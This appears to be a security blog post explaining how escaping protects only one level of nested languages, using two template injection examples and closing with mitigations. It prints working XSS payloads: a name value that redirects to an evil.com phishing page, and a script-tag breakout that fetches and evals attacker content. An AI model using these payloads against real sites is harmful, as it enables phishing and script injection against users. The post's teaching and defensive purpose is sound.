title: Escape-Bypassing Language Injection: Exploiting Multiple-Level Language Embedding
date: 2018-03-03 12:00
tags: appsec, escaping, web, plt
---
When a fix for a well-known vulnerable programming practice becomes widely
known, it runs the risk of being applied blindly without context, defeating its
very purpose. Escaping input for embedded languages like SQL and JavaScript is a
common example of this.

Many developers escape their SQL parameters and user inputs to the DOM because
they know escaping is required by the library to avoid attacks like SQL
Injections; in fact, the documentation of their library probably had a section
in red with an exclamation mark to emphasise the fact. They see what escaping is
needed, apply it, and then continue. The documentation says the code is now
safe, so what is there to worry about?

The broader problem isn't a specific API needing to be called in a certain
way with an escaping mechanism. The problem is instead specifically about
passing data from outer languages to nested inner languages, and how that
conversion is done while maintaining obvious semantics without unexpected
effects.

An unexpected effect might be new distinct SQL operations being appended to a
string that was indended to be solely part of a `WHERE` clause. The problem is
that the outer language, say, Java, didn't understand that its string should
only have applied as an operand of `=` in the `WHERE`. It only understood the
whole string as a single token, rather than a sequence of SQL tokens that have
its own set of rules.

Escaping mechanisms, such as parameterised SQL queries, translate from a more
general construct in an outer language, like a string in Java or a text node in
HTML, into a more specific construct in an inner language. It is through that
analysis of a more general outer construct that it realises that, despite it
being a Java string like any other, it has constructs that cause unintended
semantics in the inner language, and it needs to transform it to match expected
behaviour.

***

Lest this sound like pointless theorising, let's get to the point of this post:
seeing escaping just as a "library feature we use to secure this code" and
ignoring the theory of language embedding and escaping will lead to security
holes. For example, we might escape HTML in a server-side template within an
inline script tag, but not realise that escaping HTML only protects the HTML,
not languages nested inside of it like JavaScript.

_Remember that language escaping mechanisms only traverse a single level of
embedding._

In that example we have the server-side templating language, the HTML, and the
inline JavaScript. That means escaping must be done twice to traverse from the
template to the JavaScript.

Consider this example using a hypothetical Groovy-like templating language,
using `${}` as placeholders:

```html
<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
</head>
<body>
    <script>
        const initialPayload = {
            currentUserId: ${escapeHTML(currentUser.id)},
            currentUserName: "${escapeHTML(currentUser.name)}",
            welcomeMessage: `Welcome, ${escapeHTML(currentUser.name)}`,
        };
    </script>
</body>
```

Reading the documentation for the templating language, a developer will read
that "using `escapeHTML` avoids injection attacks from user input" and be
satisfied.

An adversary then enters this as their name:

```
A"+(window.location="https://evil.com/phishing-page")+"B
```

`escapeHTML` dutifully searches for angle brackets and other HTML characters
that need to be escaped, finds none, and lets it though unaltered:

```html
<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
</head>
<body>
    <script>
        var initialPayload = {
            currentUserId: 42,
            currentUserName: "A"+(window.location="https://evil.com/phishing-page")+"B",
            welcomeMessage: `Welcome, A"+(window.location="https://evil.com/phishing-page")+"B`,
        };
    </script>
</body>
```

`currentUserName` becomes `"AB"`, or at least it would if the page were not
redirected to a phishing webpage beforehand.

The escaping was bypassed by injecting one level deeper than the language doing
the escaping, injecting an inner language to bypass the escaping of the outer
one.

The direction of this can be flipped too.

As a rather convoluted example, a webapp teaching programming to beginners
allows users to enter JavaScript code into "holes" in JavaScript programs
displayed by the browser. For example, the exercise asks them to fill in a
placeholder like this to make a loop terminate:

```javascript
const chances = 10;
let chanceNumber = 0;
while (______) {
    const correct = askUserForGuess();
    if (correct) {
        break;
    }
    chanceNumber += 1;
}
```

Users can share solutions with each other to encourage collaboration. Realising
this, the developers expose a new function to the server-side templating
language for only allowing simple JavaScript expressions consisting of numbers,
symbols, arithmetic, strings, and boolean operators. Assignments, object and
array lookups, and all other forms of operations are blacklisted. They might
use a regular expression like this:

```perl
/
    ^

    (?:

        # Symbols
        (?: \w (?:\w|\d)* )

            # Numeric operators
            | (?: [+-/*] | (?:[*][*]) | [()])

            # Boolean operators
            | (?: ! | (?:===?) | (?:!==?) | [<>])

            # Numbers
            | (?: [-+]? (?: (?:\d+) | (?:\d?\.\d+)))
    )+

    $
/x
```

The escaping function is named `escapeSimpleJSExpression`, and the server side
template for this particular exercise becomes:

```html
<script>
    const chances = 10;
    let chanceNumber = 0;
    while (${escapeSimpleJSExpression(getUsersCurrentExerciseAttempt().placeholderInputs[0])}) {
        const correct = askUserForGuess();
        if (correct) {
            break;
        }
        chanceNumber += 1;
    }
</script>
```

The proposed escaping is restrictive enough to stop the sort of bypasses you
find in
[Angular 1 sandbox escapes](https://gist.github.com/jeremybuis/38c01acae19fc2ac6959).
There are some possible injection points here, as parentheses allow function
invocations, and traversing standard browser objects is possible with dots.
The lack of strings and square brackets limits injections though, and stops
injection-friendly JavaScript subsets like
[JSFuck](https://en.wikipedia.org/wiki/JSFuck).

However, that escaping still allows division, less-than operators, and symbols.
`</ script>` therefore works, which allows the escaping in the inner language
to be bypassed by injecting the outer language. With division, parentheses,
and dots allowed for arithmetic expressions, a whole remote-script loading
injection can be composed:

```html
</script><form>/me/profile</form><script>eval(JSON.parse(fetch(Array.from(document.forms).pop().textContent)).data.aboutMe)</script><script>
```

Using `fetch` and `eval` allows it to post-process payloads from the site. For
example, the adversary might put
`window.location = "https://evil.com/phishing-page"` in their user profile's
About Me section, which it can then load via the site's API with fetch and
inject into the page of anyone viewing the completed exercise.

As strings are banned, it cannot pass the URL as a string to `fetch`. Single
assignment operators are banned too, so assigning an ID to a new element that
contains the URL it needs, and looking it up in JavaScript will not work
either. Storing the URL in outer elements and pulling the value out of the
`textContent` in JavaScript usually won't work because selecting that element
requires a complex selector to avoid selecting other elements on the page, whose
attribute on the element will use the banned character `=`.

The adversary can use one of the rather old-school `document` properties like
`forms` and then `pop` the result off rather than using the banned array
indexing operator. A more stealthy attack would refine this to hide the text
content in some way and avoid the new block element `form` disrupting the DOM
flow, and perhaps even removing it from the DOM when done with `.removeChild`.

Escaping out of the inner language by using the outer language, the restricted
character set suddenly went from being quite restrictive into allowing
remote-script execution.

***

There are easy ways to fix those examples. If the JavaScript whitelister used
a real parser rather than regular expressions, `</` would be thrown out.
Running the code in a sandboxed `iframe` would be a better idea. The first
injection example could be easily thwarted by doing more server-side
whitelisting of input.

Server-side whitelisting is usually a shim though, and should only be done for
validating the domain of data, not for blocking injections. Changing view
technologies such as employing a new templating system breaks anti-injection
validation done on existing data, leading to complex, potentially-lossy
alterations of existing data. Using proper parsers does not solve the injection
problem, it just reduces the likelihood, as many injections rely on sloppy
handling of input.

Escaping data properly and not caring about what characters can potentially
inject is a better approach. The best solution is to not embed languages
unnecessarily, and to never do more than one-level of nesting. If you _must_,
escaping must be done for every traversal, so twice when there are three
languages in play.
